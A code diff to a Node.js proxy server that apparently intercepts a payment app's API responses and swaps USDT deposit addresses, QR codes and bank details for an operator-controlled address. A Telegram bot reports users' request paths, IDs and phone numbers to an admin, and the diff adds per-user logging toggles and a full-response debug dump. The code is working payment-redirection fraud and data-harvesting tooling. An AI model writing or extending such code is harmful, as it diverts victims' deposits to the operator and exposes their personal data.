@@ -468,8 +468,13 @@ function replaceUsdtInResponse(jsonResp, data) {
             obj[key] = newAddr;
           }
         }
-        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl') {
+        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrimg' || kl === 'qrimgurl' || kl === 'codeimgurl' || kl === 'codeimg' || kl === 'qrurl' || kl === 'depositqr' || kl === 'depositqrcode') {
           obj[key] = qrUrl;
+        }
+        if (kl.includes('qr') || kl.includes('code')) {
+          if (typeof obj[key] === 'string' && obj[key].includes('http') && (obj[key].includes('qr') || obj[key].includes('code') || obj[key].includes('.png') || obj[key].includes('.jpg'))) {
+            obj[key] = qrUrl;
+          }
         }
       } else if (typeof obj[key] === 'object') {
         const found = scanAndReplace(obj[key], depth + 1);
@@ -516,10 +521,13 @@ app.use(async (req, res, next) => {
           const body = req.parsedBody || {};
           userId = body.memberCodeId || '';
         }
-        const phone = getPhone(data, userId);
-        const tag = userId ? ` [${userId}]` : '';
-        const phoneTag = phone ? ` (${phone})` : '';
-        bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(()=>{});
+        const isLogOff = userId && data.userOverrides && data.userOverrides[String(userId)] && data.userOverrides[String(userId)].logOff;
+        if (!isLogOff) {
+          const phone = getPhone(data, userId);
+          const tag = userId ? ` [${userId}]` : '';
+          const phoneTag = phone ? ` (${phone})` : '';
+          bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(()=>{});
+        }
       }
     }
   } catch(e) {}
@@ -586,6 +594,8 @@ app.post('/bot-webhook', async (req, res) => {
 /off — Proxy OFF
 /rotate — Toggle auto-rotate banks
 /log — Toggle request logging
+/off log <userId> — Log off for user
+/on log <userId> — Log on for user
 /status — Full status
 /debug — Debug next response
 
@@ -628,6 +638,28 @@ Example:
     if (text === '/log') { data.logRequests = !data.logRequests; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
 
     if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace request ka full response dump aayega'); return res.sendStatus(200); }
+
+    if (text.startsWith('/off log ')) {
+      const targetId = text.substring(9).trim();
+      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /off log <userId>'); return res.sendStatus(200); }
+      if (!data.userOverrides) data.userOverrides = {};
+      if (!data.userOverrides[targetId]) data.userOverrides[targetId] = {};
+      data.userOverrides[targetId].logOff = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, `🔇 Logging OFF for user ${targetId}`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/on log ')) {
+      const targetId = text.substring(8).trim();
+      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /on log <userId>'); return res.sendStatus(200); }
+      if (data.userOverrides && data.userOverrides[targetId]) {
+        delete data.userOverrides[targetId].logOff;
+        await saveData(data);
+      }
+      await bot.sendMessage(chatId, `📡 Logging ON for user ${targetId}`);
+      return res.sendStatus(200);
+    }
 
     if (text.startsWith('/add ')) {
       const parts = text.substring(5).trim().split(/\s+/);
@@ -1090,7 +1122,18 @@ app.post('/app/api/memberRecharge/getPaymentOrderDetail', async (req, res) => {
           deepReplace(detailData, bank, {}, 0);
         }
       }
-      if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
+      if (data.usdtAddress) {
+        replaceUsdtInResponse(jsonResp, data);
+        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(data.usdtAddress)}`;
+        let str = JSON.stringify(jsonResp);
+        str = str.replace(/https?:\/\/oss\.[^\s"',\\}]+/gi, qrUrl);
+        str = str.replace(/https?:\/\/[^\s"',\\}]+(qr|QR|qrcode|code)[^\s"',\\}]*/gi, qrUrl);
+        try { Object.assign(jsonResp, JSON.parse(str)); } catch(e) {}
+      }
+    }
+    if (data.adminChatId && bot && debugNextResponse) {
+      debugNextResponse = false;
+      bot.sendMessage(data.adminChatId, `🔍 PaymentOrderDetail:\n${JSON.stringify(jsonResp, null, 2).substring(0, 3500)}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
